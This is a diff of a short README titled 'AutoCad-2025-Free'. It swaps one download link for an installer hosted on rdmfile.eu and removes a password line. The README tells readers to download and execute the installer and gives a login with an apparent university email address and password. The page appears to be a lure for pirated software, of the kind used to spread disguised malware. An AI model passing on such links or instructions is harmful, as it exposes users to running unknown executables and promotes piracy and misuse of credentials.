@@ -1,8 +1,8 @@
 # AutoCad-2025-Free
 
-[Click here to Download](https://rdmfile.eu/install/WjJfp097b72c)
+[Click here to Download](https://rdmfile.eu/install/fb7qCPgf1Gp3)
 
-[Pass : S0f4fr33!]
+
 
 Once the Installer is downloaded execute the file. The login information is: faculty1@uoft.edu Pass: S0f4fr33!
 
